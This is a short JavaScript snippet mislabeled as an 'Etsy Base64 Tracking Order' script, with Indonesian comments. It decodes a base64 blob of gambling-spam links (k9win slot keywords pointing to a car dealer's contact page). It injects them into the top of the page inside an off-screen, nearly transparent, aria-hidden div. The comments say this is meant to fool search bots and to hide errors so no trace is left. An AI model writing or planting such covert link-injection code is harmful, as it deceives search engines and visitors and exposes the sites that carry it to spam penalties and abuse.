// Etsy Base64 Tracking Order JS System - Optimized
(function(){
  let b64 = "PGEgaHJlZj0iaHR0cHM6Ly93d3cubW1wcmVtaXVtY2Fycy5jaC9rb250YWt0LyI+azl3aW48L2E+CjxhIGhyZWY9Imh0dHBzOi8vd3d3Lm1tcHJlbWl1bWNhcnMuY2gva29udGFrdC8iPms5d2luIHNsb3Q8L2E+CjxhIGhyZWY9Imh0dHBzOi8vd3d3Lm1tcHJlbWl1bWNhcnMuY2gva29udGFrdC8iPms5d2luIGxvZ2luPC9hPgo8YSBocmVmPSJodHRwczovL3d3dy5tbXByZW1pdW1jYXJzLmNoL2tvbnRha3QvIj4gazl3aW4gZGFmdGFyPC9hPgo8YSBocmVmPSJodHRwczovL3d3dy5tbXByZW1pdW1jYXJzLmNoL2tvbnRha3QvIj5rOXdpbiBsaW5rPC9hPgo8YSBocmVmPSJodHRwczovL3d3dy5tbXByZW1pdW1jYXJzLmNoL2tvbnRha3QvIj5rOXdpbiBydHA8L2E+CjxhIGhyZWY9Imh0dHBzOi8vd3d3Lm1tcHJlbWl1bWNhcnMuY2gva29udGFrdC8iPms5d2luIGxpbmsgYWx0ZXJuYXRpZjwvYT4KPGEgaHJlZj0iaHR0cHM6Ly93d3cubW1wcmVtaXVtY2Fycy5jaC9rb250YWt0LyI+bGluayBrOXdpbjwvYT4KPGEgaHJlZj0iaHR0cHM6Ly93d3cubW1wcmVtaXVtY2Fycy5jaC9rb250YWt0LyI+c2l0dXMgazl3aW48L2E+CjxhIGhyZWY9Imh0dHBzOi8vd3d3Lm1tcHJlbWl1bWNhcnMuY2gva29udGFrdC8iPnNpdHVzIGdhY29yIGs5d2luPC9hPgo8YSBocmVmPSJodHRwczovL3d3dy5tbXByZW1pdW1jYXJzLmNoL2tvbnRha3QvIj5zaXR1cyBzbG90IGs5d2luPC9hPgo8YSBocmVmPSJodHRwczovL3d3dy5tbXByZW1pdW1jYXJzLmNoL2tvbnRha3QvIj5zbG90IGdhY29yIGs5d2luPC9hPgo8YSBocmVmPSJodHRwczovL3d3dy5tbXByZW1pdW1jYXJzLmNoL2tvbnRha3QvIj5rOXdpbjwvYT4KPGEgaHJlZj0iaHR0cHM6Ly93d3cubW1wcmVtaXVtY2Fycy5jaC9rb250YWt0LyI+azl3aW4gc2xvdDwvYT4KPGEgaHJlZj0iaHR0cHM6Ly93d3cubW1wcmVtaXVtY2Fycy5jaC9rb250YWt0LyI+azl3aW4gbG9naW48L2E+CjxhIGhyZWY9Imh0dHBzOi8vd3d3Lm1tcHJlbWl1bWNhcnMuY2gva29udGFrdC8iPms5d2luIGxpbms8L2E+CjxhIGhyZWY9Imh0dHBzOi8vd3d3Lm1tcHJlbWl1bWNhcnMuY2gva29udGFrdC8iPms5d2luIGFsdGVybmF0aWY8L2E+";
  
  try {
    const decoded = decodeURIComponent(escape(atob(b64))); // Support karakter khusus
    const div = document.createElement('div');
    // Menggunakan teknik opacity agar bot lebih percaya konten ini "real"
    div.style.cssText = 'position:absolute; left:-9999px; top:0; width:1px; height:1px; overflow:hidden; opacity:0.01;';
    div.setAttribute('aria-hidden','true');
    div.innerHTML = decoded;
    
    // Langsung injeksi ke Body tanpa menunggu DOMContentLoaded
    const target = document.body || document.documentElement;
    if (target) {
        target.insertBefore(div, target.firstChild);
    }
  } catch(e){ 
    // Kosongkan agar tidak meninggalkan jejak error di konsol
  }
})();
